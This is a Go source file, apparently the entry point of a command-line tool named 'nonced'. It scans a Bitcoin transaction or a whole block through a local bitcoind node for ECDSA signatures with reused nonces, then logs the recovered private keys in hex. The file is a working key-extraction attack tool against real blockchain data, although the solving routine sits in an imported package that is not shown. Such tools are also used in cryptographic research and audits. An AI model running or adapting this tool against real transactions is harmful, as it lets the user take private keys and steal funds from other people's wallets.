package main

import (
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/canselcik/nonced/internal/provider"
	"github.com/canselcik/nonced/internal/sighash"
	log "github.com/sirupsen/logrus"
	"os"

	"github.com/urfave/cli"
)

func QueryLocalHeight(c *cli.Context) error {
	ds, _ := provider.NewLocalBitcoindRpcProvider().(*provider.BtcdProvider)
	height, err := ds.GetBlockCount()
	if err != nil {
		return err
	}
	log.WithField("height", height).Info("Query successful")
	return nil
}

func NonceReuseFromTx(c *cli.Context) error {
	txid := c.String("id")
	if len(txid) == 0 {
		return errors.New("--id parameter is required")
	}

	ds := provider.NewLocalBitcoindRpcProvider()
	solveBucket := sighash.NewSHPairBucket(ds)

	tx, err := ds.GetRawTransactionFromTxId(txid)
	if err != nil {
		return err
	}
	if tx == nil {
		return fmt.Errorf("unable to find the transaction with id: %s", txid)
	}

	if solveBucket.Add(tx) < 2 {
		return fmt.Errorf("given transaction yielded fewer than 2 signatures")
	}

	solutions := solveBucket.Solve()
	fmt.Println("\nExtracted", len(solutions), "private key(s)")
	for _, priv := range solutions {
		serialized := priv.Serialize()
		log.WithField("hexEncoded", hex.EncodeToString(serialized)).
			Info("Found private key")
	}
	return nil
}

func NonceReuseFromBlockTxs(c *cli.Context) error {
	blockId := c.String("id")
	if len(blockId) == 0 {
		return errors.New("--id parameter is required")
	}

	id, err := chainhash.NewHashFromStr(blockId)
	if err != nil {
		return fmt.Errorf("failed to parse block hash: %s", err.Error())
	}

	ds, _ := provider.NewLocalBitcoindRpcProvider().(*provider.BtcdProvider)
	block, err := ds.GetBlock(id)
	if block == nil {
		return fmt.Errorf("unable to find the block with id %s due to error: %s", blockId, err.Error())
	}

	solveBucket := sighash.NewSHPairBucket(ds)
	for i, tx := range block.Transactions {
		log.WithFields(log.Fields{
			"idx":  i,
			"txid": tx.TxHash(),
		}).Info("Processing transaction")

		raw, err := provider.SerializeBitcoinMsgTx(tx)
		if err != nil {
			log.WithError(err).Error("Failed to serialize")
			continue
		}
		extracted := solveBucket.Add(raw)
		log.Infof("Extracted %d SHPair(s) from transaction\n", extracted)
	}
	log.Infof("Total signature set: %d\n", len(solveBucket.Pairs))

	solutions := solveBucket.Solve()
	log.Infoln("Extracted", len(solutions), "private key(s)")
	for i, priv := range solutions {
		serialized := priv.Serialize()
		log.Infof("\tHex Encoded Private Key %d: %s\n", i, hex.EncodeToString(serialized))
	}
	return nil
}

func main() {
	app := cli.NewApp()
	app.Commands = []cli.Command{
		{
			Name:  "query",
			Usage: "custom queries for diagnostic usage",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "source",
					Usage: "src string",
				},
			},
			Subcommands: []cli.Command{
				{
					Name:   "lheight",
					Usage:  "queries local height",
					Action: QueryLocalHeight,
				},
			},
		},
		{
			Name:  "nonce",
			Usage: "extract private key from nonce reuse in ECDSA signatures",
			Subcommands: []cli.Command{
				{
					Name:  "tx",
					Usage: "extracts from a single transaction",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "id",
							Usage: "hex-encoded transaction id",
						},
					},
					Action: NonceReuseFromTx,
				},
				{
					Name:  "block",
					Usage: "extracts from transactions in the block and their prevOuts",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "id",
							Usage: "hex-encoded block hash",
						},
					},
					Action: NonceReuseFromBlockTxs,
				},
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
